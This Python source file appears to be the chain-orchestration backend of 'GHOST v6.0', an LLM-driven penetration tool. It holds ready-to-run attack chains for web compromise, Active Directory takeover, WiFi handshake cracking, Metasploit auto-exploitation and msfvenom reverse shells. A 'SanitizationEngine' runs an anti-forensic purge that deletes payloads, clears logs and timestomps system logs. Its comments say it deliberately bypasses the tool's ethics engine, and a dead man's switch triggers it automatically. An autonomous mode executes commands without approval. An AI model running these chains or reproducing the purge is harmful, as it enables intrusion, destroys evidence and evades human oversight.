"""
GHOST v6.0 — Chain Orchestration Engine
Builds and executes multi-phase Operation Graphs.
Each chain has phases, decision gates, and auto-branching based on tool output.
"""

import time
import threading
from datetime import datetime, timezone

from backend.governance import GovernanceLayer

class SanitizationEngine:

    """
    Emergency cleanup protocol. Purges active shells, payloads, and local logs.
    Uses subprocess directly to BYPASS ethics engine during emergency operations.
    """
    @staticmethod
    def emergency_purge(bridge):
        print("\n!!! TELEMETRY LOSS DETECTED: INITIATING SHADOW PROTOCOL !!!\n")
        # Kill shells
        bridge.kill_all()
        
        # Anti-Forensic Time-Stomping (bypasses ethics — emergency only)
        SanitizationEngine.timestomp_purge()

    @staticmethod
    def timestomp_purge():
        """
        Anti-Forensic Time-Stomping.
        Captures MACE timestamps from native kernel.dll / vmlinuz, and applies them to logs after erasure.
        Uses subprocess directly to bypass ethics engine — this is an EMERGENCY protocol.
        All commands combined into a single bash invocation so variables persist.
        """
        import subprocess as sp
        import os
        purge_script = (
            "ref_time=$(stat -c %y /boot/vmlinuz* 2>/dev/null | head -n1) || ref_time='2019-01-01 12:00:00'; "
            "rm -rf /tmp/ghost_payloads 2>/dev/null; "
            "clearev 2>/dev/null || true; "
            "touch -d \"$ref_time\" /var/log/auth.log /var/log/syslog 2>/dev/null || true"
        )
        try:
            if os.name == 'nt':
                sp.run(f"wsl -d kali-linux -- bash -c '{purge_script}'", shell=True, timeout=15)
            else:
                sp.run(f"bash -c '{purge_script}'", shell=True, timeout=15)
        except Exception:
            pass  # Emergency protocol — never crash



class ChainEngine:
    """
    Intelligent Chain Construction — builds Operation Graphs, not isolated commands.
    Supports built-in chain templates and custom chains.
    """

    # ── Built-in Chain Templates ──────────────────────────────────────────

    CHAIN_TEMPLATES = {
        "NETWORK_DISCOVERY": {
            "name": "Zero-Knowledge Network Discovery",
            "description": "Map the entire network from zero information.",
            "phases": [
                {
                    "id": 1,
                    "name": "Local Environment Recon",
                    "description": "Enumerate interfaces, routes, DNS",
                    "commands": [
                        {"tool": "ip", "args": "addr", "category": "RECON"},
                        {"tool": "ip", "args": "route", "category": "RECON"},
                        {"tool": "cat", "args": "/etc/resolv.conf", "category": "RECON"},
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 2,
                    "name": "Passive Host Discovery",
                    "description": "Listen for ARP/mDNS/NetBIOS without generating traffic",
                    "commands": [
                        {"tool": "tcpdump", "args": "-i any -n arp or icmp or port 5353 -c 50", "category": "RECON"},
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 3,
                    "name": "Active Host Discovery",
                    "description": "ARP scan and ICMP sweep of local subnet",
                    "commands": [
                        {"tool": "netdiscover", "args": "-r {subnet} -P", "category": "RECON"},
                        {"tool": "nmap", "args": "-sn -PE -PP -PM {subnet}", "category": "RECON"},
                    ],
                    "auto_advance": False,
                },
                {
                    "id": 4,
                    "name": "Service Enumeration (Stealth)",
                    "description": "Port scan and service version detection using IDS evasion",
                    "commands": [
                        {"tool": "nmap", "args": "-sV -sC -O -D RND:10 --scan-delay 1s --version-intensity 5 {live_hosts}", "category": "RECON"},
                    ],
                    "auto_advance": False,
                },
                {
                    "id": 5,
                    "name": "Intelligence Synthesis",
                    "description": "Compile findings into target map",
                    "commands": [],
                    "action": "synthesize_recon",
                    "auto_advance": False,
                },
            ],
        },

        "WEB_LOGIC_PIVOT": {
            "name": "Web Proxy SSRF to Internal SQLi",
            "description": "Exploit web logic to pivot from external assets to internal databases.",
            "phases": [
                {
                    "id": 1,
                    "name": "SSRF Discovery Injection",
                    "description": "Locate SSRF parameters and blind injection timing loops",
                    "commands": [
                        {"tool": "python3", "args": "-c \"print('[*] Scanning parameters for SSRF external callbacks...')\"", "category": "VULN"}
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 2,
                    "name": "Internal Network Map via SSRF",
                    "description": "Sweep localhost and subnets through to map internal DBs",
                    "commands": [
                        {"tool": "ffuf", "args": "-w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://{target}/proxy?url=http://127.0.0.1:FUZZ", "category": "RECON"}
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 3,
                    "name": "Sub-Database SQLi (Tampered)",
                    "description": "Execute database extraction wrapped inside SSRF URL encoding",
                    "commands": [
                        {"tool": "sqlmap", "args": "-u 'http://{target}/proxy?url=http://127.0.0.1:3306/db' --tamper=ssrf,space2comment --dump --batch", "category": "EXPLOIT"}
                    ],
                    "auto_advance": False,
                }
            ],
        },

        "WEB_COMPROMISE": {
            "name": "Web Server Compromise Chain",
            "description": "Full attack chain against a web server target.",
            "phases": [
                {
                    "id": 1,
                    "name": "Surface Mapping",
                    "description": "Web service enumeration and tech fingerprinting",
                    "commands": [
                        {"tool": "nmap", "args": "-sV -sC -p 80,443,8080,8443 {target}", "category": "RECON"},
                        {"tool": "nikto", "args": "-h {target}", "category": "VULN"},
                        {"tool": "dirb", "args": "http://{target} /usr/share/dirb/wordlists/common.txt", "category": "RECON"},
                        {"tool": "whatweb", "args": "http://{target}", "category": "RECON"},
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 2,
                    "name": "Vulnerability Identification",
                    "description": "Search for exploits and test injection points",
                    "commands": [
                        {"tool": "searchsploit", "args": "{web_server_version}", "category": "VULN"},
                        {"tool": "sqlmap", "args": '-u "http://{target}/{injectable_url}" --batch --risk=1', "category": "VULN"},
                    ],
                    "decision_gate": {
                        "sqli_found": {"goto": 4, "label": "Database Exploitation"},
                        "rce_found": {"goto": 5, "label": "Shell Acquisition"},
                        "nothing": {"goto": 3, "label": "Credential Brute Force"},
                    },
                    "auto_advance": False,
                },
                {
                    "id": 3,
                    "name": "Credential Access",
                    "description": "Brute force login credentials",
                    "commands": [
                        {"tool": "hydra", "args": '-L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt http-post-form://{target} "/login:username=^USER^&password=^PASS^:F=invalid"', "category": "EXPLOIT"},
                    ],
                    "auto_advance": False,
                },
                {
                    "id": 4,
                    "name": "Database Exploitation",
                    "description": "Dump database via SQLi and extract credentials",
                    "commands": [
                        {"tool": "sqlmap", "args": '-u "http://{target}/{injectable_url}" --dump --batch', "category": "EXPLOIT"},
                    ],
                    "auto_advance": False,
                },
                {
                    "id": 5,
                    "name": "Shell Acquisition",
                    "description": "Obtain reverse shell on target",
                    "commands": [
                        {"tool": "msfvenom", "args": "-p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT=4444 -f elf -o /tmp/rev_shell.elf", "category": "EXPLOIT"},
                    ],
                    "auto_advance": False,
                },
                {
                    "id": 6,
                    "name": "Post-Exploitation",
                    "description": "System enumeration and credential harvesting",
                    "commands": [
                        {"tool": "meterpreter", "args": "getuid; sysinfo; ifconfig; route", "category": "POST"},
                    ],
                    "auto_advance": False,
                },
                {
                    "id": 7,
                    "name": "Pivot Assessment",
                    "description": "Discover additional networks and pivot opportunities",
                    "commands": [
                        {"tool": "netstat", "args": "-tulpn", "category": "POST"},
                        {"tool": "arp", "args": "-a", "category": "POST"},
                        {"tool": "ip", "args": "route", "category": "POST"},
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 8,
                    "name": "System Sanitization",
                    "description": "Post-research cleanup routine to remove logs and implants",
                    "commands": [
                        {"tool": "meterpreter", "args": "rm /tmp/rev_shell.elf; clearev", "category": "POST"},
                    ],
                    "auto_advance": False,
                },
            ],
        },

        "AD_CHAIN": {
            "name": "Active Directory Attack Chain",
            "description": "Full AD compromise from initial foothold to domain admin.",
            "phases": [
                {
                    "id": 1,
                    "name": "AD Enumeration",
                    "description": "BloodHound collection and LDAP dump",
                    "commands": [
                        {"tool": "bloodhound-python", "args": "-d {domain} -u {user} -p {pass} -c All -dc {dc_ip}", "category": "AD"},
                        {"tool": "ldapdomaindump", "args": "ldap://{dc_ip} -o /tmp/ad_dump/", "category": "AD"},
                        {"tool": "enum4linux", "args": "-a {dc_ip}", "category": "AD"},
                    ],
                    "auto_advance": False,
                },
                {
                    "id": 2,
                    "name": "Credential Harvesting",
                    "description": "Kerberoasting, AS-REP Roasting, NTLM capture",
                    "commands": [
                        {"tool": "GetUserSPNs.py", "args": "{domain}/{user}:{pass} -outputfile /tmp/kerb_hashes.txt", "category": "AD"},
                        {"tool": "GetNPUsers.py", "args": "{domain}/ -usersfile /tmp/users.txt -format hashcat", "category": "AD"},
                    ],
                    "auto_advance": False,
                },
                {
                    "id": 3,
                    "name": "Hash Cracking",
                    "description": "Crack captured hashes",
                    "commands": [
                        {"tool": "hashcat", "args": "-m 13100 /tmp/kerb_hashes.txt /usr/share/wordlists/rockyou.txt", "category": "CRYPTO"},
                    ],
                    "auto_advance": False,
                },
                {
                    "id": 4,
                    "name": "Lateral Movement",
                    "description": "Pass-the-Hash or cracked credential access",
                    "commands": [
                        {"tool": "psexec.py", "args": "-hashes {lm}:{ntlm} {user}@{target}", "category": "AD"},
                        {"tool": "wmiexec.py", "args": "-hashes {lm}:{ntlm} {user}@{target}", "category": "AD"},
                    ],
                    "auto_advance": False,
                },
                {
                    "id": 5,
                    "name": "Domain Compromise",
                    "description": "DCSync and golden ticket creation",
                    "commands": [
                        {"tool": "secretsdump.py", "args": "{domain}/{admin}:{pass}@{dc_ip}", "category": "AD"},
                    ],
                    "requires_token": "DC-SYNC-AUTHORIZED",
                    "auto_advance": False,
                },
            ],
        },

        "WIRELESS_AUDIT": {
            "name": "Wireless Security Audit",
            "description": "WiFi reconnaissance, handshake capture, and cracking.",
            "phases": [
                {
                    "id": 1,
                    "name": "Monitor Mode Setup",
                    "description": "Enable wireless monitor mode",
                    "commands": [
                        {"tool": "airmon-ng", "args": "start wlan0", "category": "WIRELESS"},
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 2,
                    "name": "WiFi Scanning",
                    "description": "Scan for nearby access points and clients",
                    "commands": [
                        {"tool": "airodump-ng", "args": "wlan0mon -w /tmp/capture --output-format pcap,csv", "category": "WIRELESS"},
                        {"tool": "wash", "args": "-i wlan0mon", "category": "WIRELESS"},
                    ],
                    "auto_advance": False,
                },
                {
                    "id": 3,
                    "name": "Handshake Capture",
                    "description": "Target specific AP and capture WPA handshake",
                    "commands": [
                        {"tool": "airodump-ng", "args": "-c {channel} --bssid {bssid} -w /tmp/handshake wlan0mon", "category": "WIRELESS"},
                        {"tool": "aireplay-ng", "args": "-0 5 -a {bssid} -c {client_mac} wlan0mon", "category": "WIRELESS"},
                    ],
                    "auto_advance": False,
                },
                {
                    "id": 4,
                    "name": "PSK Cracking",
                    "description": "Crack captured WPA/WPA2 handshake",
                    "commands": [
                        {"tool": "aircrack-ng", "args": "/tmp/handshake.cap -w /usr/share/wordlists/rockyou.txt", "category": "WIRELESS"},
                    ],
                    "auto_advance": False,
                },
            ],
        },

        "OSINT_CHAIN": {
            "name": "OSINT Intelligence Gathering",
            "description": "Build a complete profile from username, email, or domain.",
            "phases": [
                {
                    "id": 1,
                    "name": "Email/Domain Recon",
                    "description": "Harvest emails, subdomains, and infrastructure data",
                    "commands": [
                        {"tool": "theHarvester", "args": "-d {domain} -b all -f /tmp/harvest.html", "category": "OSINT"},
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 2,
                    "name": "Username Investigation",
                    "description": "Find social media accounts across platforms",
                    "commands": [
                        {"tool": "sherlock", "args": "{username} --output /tmp/sherlock_results.txt", "category": "OSINT"},
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 3,
                    "name": "DNS & Infrastructure",
                    "description": "Deep DNS enumeration and subdomain discovery",
                    "commands": [
                        {"tool": "dnsrecon", "args": "-d {domain} -t std,brt", "category": "OSINT"},
                        {"tool": "dig", "args": "{domain} ANY +short", "category": "OSINT"},
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 4,
                    "name": "SPF/DMARC Assessment",
                    "description": "Check email spoofing vulnerability",
                    "commands": [
                        {"tool": "spoofcheck.py", "args": "{domain}", "category": "OSINT"},
                    ],
                    "auto_advance": False,
                },
            ],
        },

        "MOBILE_CHAIN": {
            "name": "Android Device Assessment",
            "description": "Wireless ADB connection and device enumeration.",
            "phases": [
                {
                    "id": 1,
                    "name": "ADB Discovery",
                    "description": "Scan for wireless ADB-enabled devices",
                    "commands": [
                        {"tool": "nmap", "args": "-p 5555 {subnet}", "category": "RECON"},
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 2,
                    "name": "ADB Connection",
                    "description": "Connect to target device via wireless ADB",
                    "commands": [
                        {"tool": "adb", "args": "connect {target}:5555", "category": "MOBILE"},
                    ],
                    "auto_advance": False,
                },
                {
                    "id": 3,
                    "name": "Device Enumeration",
                    "description": "Gather device info, installed apps, and files",
                    "commands": [
                        {"tool": "adb", "args": "shell getprop", "category": "MOBILE"},
                        {"tool": "adb", "args": "shell pm list packages", "category": "MOBILE"},
                    ],
                    "auto_advance": False,
                },
                {
                    "id": 4,
                    "name": "Screen Mirror",
                    "description": "Real-time screen mirroring and control",
                    "commands": [
                        {"tool": "scrcpy", "args": "--serial {target}:5555", "category": "MOBILE"},
                    ],
                    "auto_advance": False,
                },
            ],
        },

        "DEFENSE_CHAIN": {
            "name": "Defensive Blue Hat Operations",
            "description": "Auto-patch, IDS setup, and honeypot deployment.",
            "phases": [
                {
                    "id": 1,
                    "name": "System Audit",
                    "description": "Check for vulnerabilities on own system",
                    "commands": [
                        {"tool": "linpeas", "args": "", "category": "DEFENSE"},
                        {"tool": "nmap", "args": "-sV -sC localhost", "category": "DEFENSE"},
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 2,
                    "name": "Firewall Hardening",
                    "description": "Configure iptables/ufw rules",
                    "commands": [
                        {"tool": "ufw", "args": "status verbose", "category": "DEFENSE"},
                    ],
                    "auto_advance": False,
                },
                {
                    "id": 3,
                    "name": "IDS Deployment",
                    "description": "Set up intrusion detection monitoring",
                    "commands": [
                        {"tool": "fail2ban-client", "args": "status", "category": "DEFENSE"},
                    ],
                    "auto_advance": False,
                },
            ],
        },

        "FUZZING_CHAIN": {
            "name": "Zero-Day Discovery / Fuzzing Integration",
            "description": "Connect to software testing suite to identify unknown instabilities",
            "phases": [
                {
                    "id": 1,
                    "name": "Target Instrumentation",
                    "description": "Prepare target binary/endpoint for fuzzing",
                    "commands": [
                        {"tool": "afl-cc", "args": "-o {target_bin} {target_source}", "category": "FUZZING"},
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 2,
                    "name": "Fuzzing Execution",
                    "description": "Run AFL++ fuzzer and monitor for crashes",
                    "commands": [
                        {"tool": "afl-fuzz", "args": "-i input_dir -o output_dir -- ./{target_bin}", "category": "FUZZING"},
                    ],
                    "auto_advance": False,
                },
            ],
        },

        "METASPLOIT_AUTO_PWN": {
            "name": "Autonomous Metasploit Orchestration",
            "description": "Identify vulnerability, build MSF resource script, and execute exploit for a reverse shell.",
            "phases": [
                {
                    "id": 1,
                    "name": "Service Vulnerability Mapping",
                    "description": "Map services to CVEs using SearchSploit and Nmap scripts",
                    "commands": [
                        {"tool": "searchsploit", "args": "--nmap {nmap_xml_report} --json > /tmp/searchsploit_{target}.json", "category": "VULN"},
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 2,
                    "name": "MSF Resource Generation",
                    "description": "Generate msfconsole .rc script based on identified CVE",
                    "commands": [
                        {"tool": "python3", "args": "-c \"import sys; print(f'use exploit/{msf_module}\\nset RHOSTS {target}\\nset LHOST {lhost}\\nset LPORT 4444\\nrun\\nexit')\" > /tmp/autopwn_{target}.rc", "category": "EXPLOIT"},
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 3,
                    "name": "Metasploit Execution",
                    "description": "Run the generated resource script headless",
                    "commands": [
                        {"tool": "msfconsole", "args": "-q -r /tmp/autopwn_{target}.rc", "category": "EXPLOIT"},
                    ],
                    "auto_advance": False,
                },
            ],
        },

        "ADVANCED_WEB_ARSENAL": {
            "name": "Advanced Web Application Arsenal",
            "description": "Full-spectrum web attack using Gobuster, WPScan, and SQLMap tamper scripts.",
            "phases": [
                {
                    "id": 1,
                    "name": "Deep Directory Bruteforce",
                    "description": "Fast directory enumeration with Gobuster",
                    "commands": [
                        {"tool": "gobuster", "args": "dir -u http://{target} -w /usr/share/wordlists/dirb/big.txt -t 50 -q -o /tmp/gobuster_{target}.txt", "category": "RECON"},
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 2,
                    "name": "CMS Fingerprinting & Exploitation",
                    "description": "Identify and exploit specific CMS vulnerabilities (e.g. WordPress)",
                    "commands": [
                        {"tool": "wpscan", "args": "--url http://{target} --enumerate p,t,u --api-token {wpscan_token}", "category": "VULN"},
                        {"tool": "nikto", "args": "-h http://{target} -Tuning x 6", "category": "VULN"},
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 3,
                    "name": "WAF-Bypass SQL Injection",
                    "description": "Automated SQLMap with advanced tampers",
                    "commands": [
                        {"tool": "sqlmap", "args": "-u 'http://{target}/{injectable_url}' --batch --random-agent --tamper=space2comment,charencode --dump", "category": "EXPLOIT"},
                    ],
                    "auto_advance": False,
                },
            ],
        },

        "OSINT_DEEP_DIVE": {
            "name": "Deep Infrastructure & Metadata Intelligence",
            "description": "Exhaustive OSINT using Amass, DNSRecon, and document metadata harvesting.",
            "phases": [
                {
                    "id": 1,
                    "name": "Exhaustive Subdomain Enum",
                    "description": "Use Amass to find all hidden subdomains",
                    "commands": [
                        {"tool": "amass", "args": "enum -d {domain} -passive -o /tmp/amass_{domain}.txt", "category": "OSINT"},
                    ],
                    "auto_advance": True,
                },
                {
                    "id": 2,
                    "name": "Document Metadata Harvesting",
                    "description": "Download public docs (PDF, DOCX) and extract metadata (authors, software)",
                    "commands": [
                        {"tool": "metagoofil", "args": "-d {domain} -t pdf,doc,docx -l 50 -n 50 -o /tmp/metagoofil_{domain} -f /tmp/metagoofil_{domain}.html", "category": "OSINT"},
                    ],
                    "auto_advance": False,
                },
            ],
        },
    }

    # ── Chain Execution Modes ─────────────────────────────────────────────

    EXECUTION_MODES = {
        "VERBOSE": "Report at each phase gate. Full details.",
        "STANDARD": "Auto-propose next phase, pause for approval.",
        "STEALTH": "Minimize output, maximize delay between commands.",
        "FULL_AUTO": "Silent execution. Summary at chain end or on error.",
    }

    def __init__(self, memory_manager, ethics_engine, bridge):
        self.memory = memory_manager
        self.ethics = ethics_engine
        self.bridge = bridge
        self.governance = GovernanceLayer(memory_manager, ethics_engine)
        self.active_chain = None
        self.chain_state = {}
        self.execution_mode = "STANDARD"

        
        # Dead Man's Switch
        self.last_heartbeat = time.time()
        self.watchdog_thread = threading.Thread(target=self._watchdog_loop, daemon=True)
        self.watchdog_thread.start()

    def update_heartbeat(self):
        """Update the last heartbeat timestamp from frontend telemtry."""
        self.last_heartbeat = time.time()

    def _watchdog_loop(self):
        """Monitor for telemetry loss (>600s) and trigger emergency purge."""
        while True:
            time.sleep(30)
            # 600s = 10 minutes without frontend contact
            if time.time() - self.last_heartbeat > 600:
                SanitizationEngine.emergency_purge(self.bridge)
                self.halt_chain("EMERGENCY_PURGE: Telemetry lost for >600s")
                # Reset heartbeat so it doesn't trigger continuously
                self.last_heartbeat = time.time()

    # ═══════════════════════════════════════════════════════════════
    #  Enhancement #4: Smart Chain Auto-Selection
    # ═══════════════════════════════════════════════════════════════

    # Keyword → Chain mapping for automatic selection
    CHAIN_KEYWORDS = {
        "NETWORK_DISCOVERY": [
            "scan the network", "discover hosts", "network discovery", "map the network",
            "find devices", "what's on the network", "enumerate network", "arp scan",
            "netdiscover", "host discovery", "scan subnet",
        ],
        "WEB_COMPROMISE": [
            "hack the website", "web attack", "web server", "exploit web",
            "sql injection", "sqli", "website vulnerability", "web pentest",
            "nikto", "dirb", "gobuster", "web compromise",
        ],
        "WEB_LOGIC_PIVOT": [
            "ssrf", "server side request", "pivot through web", "internal network via web",
            "proxy attack", "web logic",
        ],
        "AD_CHAIN": [
            "active directory", "domain controller", "kerberoast", "bloodhound",
            "domain admin", "ad attack", "ldap", "pass the hash", "dcsync",
        ],
        "WIRELESS_AUDIT": [
            "wifi", "wireless", "wpa", "handshake", "aircrack", "deauth",
            "wireless audit", "wifi hack", "capture handshake",
        ],
        "MOBILE_CHAIN": [
            "android", "mobile", "adb", "apk", "phone", "frida",
            "mobile attack", "android hack",
        ],
        "CLOUD_PIVOT": [
            "cloud", "aws", "azure", "gcp", "metadata", "imds",
            "cloud attack", "iam", "s3 bucket",
        ],
        "IOT_SWARM": [
            "iot", "smart home", "mqtt", "zigbee", "ble",
            "internet of things", "embedded", "firmware",
        ],
    }

    def auto_select_chain(self, user_input, context=None):
        """
        Enhancement #4: Automatically select the best chain template
        based on user input keywords and session context.

        Args:
            user_input: operator's natural language request
            context: optional dict with session intel (discovered_hosts, etc.)

        Returns:
            dict with {chain_name, confidence, reason} or None if no match
        """
        user_lower = user_input.lower()
        scores = {}

        # Score each chain by keyword match density
        for chain_name, keywords in self.CHAIN_KEYWORDS.items():
            if chain_name not in self.CHAIN_TEMPLATES:
                continue
            score = 0
            matched_keywords = []
            for kw in keywords:
                if kw in user_lower:
                    # Longer keyword matches are worth more
                    score += len(kw.split())
                    matched_keywords.append(kw)
            if score > 0:
                scores[chain_name] = {
                    "score": score,
                    "matched": matched_keywords,
                }

        # Context-aware boosting
        if context and scores:
            hosts = context.get("discovered_hosts", [])

            # If we have discovered hosts with web ports, boost web chains
            web_ports = {80, 443, 8080, 8443}
            has_web = any(
                web_ports & set(h.get("ports", []))
                for h in hosts
            )
            if has_web:
                for chain in ("WEB_COMPROMISE", "WEB_LOGIC_PIVOT"):
                    if chain in scores:
                        scores[chain]["score"] += 2

            # If we have hosts with SMB/AD ports, boost AD chain
            ad_ports = {88, 389, 445, 636, 3268}
            has_ad = any(
                ad_ports & set(h.get("ports", []))
                for h in hosts
            )
            if has_ad and "AD_CHAIN" in scores:
                scores["AD_CHAIN"]["score"] += 3

            # If no hosts discovered yet, boost NETWORK_DISCOVERY
            if not hosts and "NETWORK_DISCOVERY" in scores:
                scores["NETWORK_DISCOVERY"]["score"] += 2

        if not scores:
            return None

        # Pick the highest scoring chain
        best_chain = max(scores, key=lambda k: scores[k]["score"])
        best_info = scores[best_chain]
        max_possible = max(len(kws) for kws in self.CHAIN_KEYWORDS.values())
        confidence = min(best_info["score"] / max_possible, 1.0)

        return {
            "chain_name": best_chain,
            "chain_display_name": self.CHAIN_TEMPLATES[best_chain]["name"],
            "confidence": round(confidence, 2),
            "reason": f"Matched keywords: {', '.join(best_info['matched'])}",
            "all_scores": {k: v["score"] for k, v in scores.items()},
        }

    def list_chains(self):
        """List all available chain templates."""
        return {
            name: {
                "name": chain["name"],
                "description": chain["description"],
                "phases": len(chain["phases"]),
            }
            for name, chain in self.CHAIN_TEMPLATES.items()
        }

    def start_chain(self, chain_name, variables=None):
        """
        Start executing a chain template.
        variables: dict of template variables {target, subnet, domain, etc.}
        """
        template = self.CHAIN_TEMPLATES.get(chain_name)
        if not template:
            return {"error": f"Unknown chain: {chain_name}"}

        self.active_chain = chain_name
        self.chain_state = {
            "name": template["name"],
            "template": chain_name,
            "current_phase": 1,
            "total_phases": len(template["phases"]),
            "variables": variables or {},
            "started_at": datetime.now(timezone.utc).isoformat(),
            "phase_results": {},
            "status": "ACTIVE",
            "decision_path": [],
        }

        # Update session
        self.memory.set_active_chain(chain_name, 1)

        return self._get_current_phase()

    def get_chain_status(self):
        """Get current chain execution status."""
        if not self.active_chain:
            return {"status": "NO_CHAIN", "message": "No active chain."}

        template = self.CHAIN_TEMPLATES.get(self.active_chain, {})
        current = self.chain_state.get("current_phase", 0)
        total = self.chain_state.get("total_phases", 0)

        phase_info = None
        for p in template.get("phases", []):
            if p["id"] == current:
                phase_info = p
                break

        return {
            "status": self.chain_state.get("status", "UNKNOWN"),
            "chain_name": template.get("name", ""),
            "template": self.active_chain,
            "current_phase": current,
            "total_phases": total,
            "phase_name": phase_info["name"] if phase_info else "",
            "phase_description": phase_info["description"] if phase_info else "",
            "execution_mode": self.execution_mode,
            "variables": self.chain_state.get("variables", {}),
            "decision_path": self.chain_state.get("decision_path", []),
        }

    def advance_phase(self, decision=None):
        """
        Advance to the next phase or follow a decision gate.
        decision: key from decision_gate dict (e.g., 'sqli_found')
        """
        if not self.active_chain:
            return {"error": "No active chain"}

        template = self.CHAIN_TEMPLATES[self.active_chain]
        current_phase_id = self.chain_state["current_phase"]

        # Find current phase
        current_phase = None
        for p in template["phases"]:
            if p["id"] == current_phase_id:
                current_phase = p
                break

        if not current_phase:
            return {"error": "Current phase not found"}

        # Check for decision gate
        if decision and "decision_gate" in current_phase:
            gate = current_phase["decision_gate"]
            if decision in gate:
                next_id = gate[decision]["goto"]
                label = gate[decision]["label"]
                self.chain_state["decision_path"].append({
                    "from_phase": current_phase_id,
                    "decision": decision,
                    "to_phase": next_id,
                    "label": label,
                })
                self.chain_state["current_phase"] = next_id
                self.memory.set_active_chain(self.active_chain, next_id)
                return self._get_current_phase()

        # Linear advance
        next_id = current_phase_id + 1
        if next_id > self.chain_state["total_phases"]:
            self.chain_state["status"] = "COMPLETE"
            self.memory.set_active_chain(None)
            return {
                "status": "CHAIN_COMPLETE",
                "message": f"Chain '{template['name']}' completed.",
                "results": self.chain_state.get("phase_results", {}),
            }

        self.chain_state["current_phase"] = next_id
        self.memory.set_active_chain(self.active_chain, next_id)
        return self._get_current_phase()

    def execute_current_phase(self, socketio=None):
        """Execute all commands in the current phase."""
        phase = self._get_current_phase()
        if "error" in phase:
            return phase

        results = []
        commands = phase.get("commands", [])
        
        template = self.CHAIN_TEMPLATES.get(self.active_chain, {})
        req_tier = phase.get("diagnostic_tier", template.get("diagnostic_tier", 1))
        target_ip = self.chain_state.get("variables", {}).get("target")

        if target_ip:
            profile = self.memory.get_target_profile(target_ip) or {"ip": target_ip}
            mvd = self.governance.evaluate_mvd(profile, phase.get("name"), req_tier)
            
            if mvd["action"] == "HALT":
                self.halt_chain(mvd["reason"])
                return {"status": "HALT", "message": mvd["reason"]}
            elif mvd["action"] == "DOWNGRADE":
                if socketio:
                    socketio.emit("system_message", {"message": f"🧠 Governance MVD: Downgrading Tier-{req_tier} to Tier-{mvd['approved_tier']}. {mvd['reason']}"})
                # In a real scenario, this would swap the command. Continuing for now assuming safety.

        for cmd_info in commands:

            # Substitute variables
            full_command = f"{cmd_info['tool']} {cmd_info['args']}"
            for var, val in self.chain_state.get("variables", {}).items():
                full_command = full_command.replace(f"{{{var}}}", str(val))

            # Ethics check
            target_ip = self.bridge._extract_ip(full_command)
            verdict = self.ethics.check_command(full_command, target_ip)

            cmd_result = {
                "command": full_command,
                "ethics_verdict": verdict,
                "executed": False,
                "output": None,
            }

            if verdict["verdict"] == "HALT":
                cmd_result["halt_reason"] = verdict["reason"]
                if socketio:
                    socketio.emit("chain_halt", {
                        "command": full_command,
                        "reason": verdict["reason"],
                    })
            elif verdict["verdict"] in ["ALLOW", "PROPOSE"]:
                mode = self.memory.get_mode()
                if verdict["verdict"] == "ALLOW" or mode == "AUTONOMOUS":
                    exec_result = self.bridge.execute_command(full_command)
                    cmd_result["executed"] = True
                    cmd_result["output"] = exec_result

                    # Feed back to LLM for analysis
                    if exec_result["status"] == "OK" and exec_result["stdout"]:
                        llm_analysis = self.bridge.feed_output_to_llm(
                            full_command, exec_result["stdout"], exec_result["exit_code"]
                        )
                        cmd_result["llm_analysis"] = llm_analysis
                else:
                    cmd_result["awaiting_approval"] = True

            results.append(cmd_result)

        # Store phase results
        phase_id = self.chain_state["current_phase"]
        self.chain_state["phase_results"][phase_id] = results

        return {
            "phase": phase_id,
            "phase_name": phase.get("name", ""),
            "results": results,
            "has_decision_gate": "decision_gate" in phase,
            "decision_options": list(phase.get("decision_gate", {}).keys()),
        }

    def halt_chain(self, reason="User requested halt"):
        """Halt the active chain."""
        if self.active_chain:
            self.chain_state["status"] = "HALTED"
            self.chain_state["halt_reason"] = reason
            self.chain_state["halted_at"] = datetime.now(timezone.utc).isoformat()
            self.memory.set_active_chain(None)

            name = self.chain_state.get("name", self.active_chain)
            self.active_chain = None
            return {"status": "HALTED", "message": f"Chain '{name}' halted: {reason}"}
        return {"status": "NO_CHAIN"}

    def set_execution_mode(self, mode):
        """Set chain execution mode."""
        if mode.upper() in self.EXECUTION_MODES:
            self.execution_mode = mode.upper()
            return True
        return False

    def set_variable(self, key, value):
        """Set or update a chain variable."""
        if self.chain_state:
            self.chain_state.setdefault("variables", {})[key] = value
            return True
        return False

    # ── Helpers ────────────────────────────────────────────────────────────

    def _get_current_phase(self):
        """Get the current phase details with resolved variables."""
        if not self.active_chain:
            return {"error": "No active chain"}

        template = self.CHAIN_TEMPLATES[self.active_chain]
        phase_id = self.chain_state["current_phase"]

        for phase in template["phases"]:
            if phase["id"] == phase_id:
                # Check for required tokens
                if phase.get("requires_token"):
                    token = phase["requires_token"]
                    if not self.memory.has_override_token(token):
                        return {
                            **phase,
                            "halted": True,
                            "halt_reason": f"Phase requires token: {token}",
                        }
                return phase

        return {"error": f"Phase {phase_id} not found"}
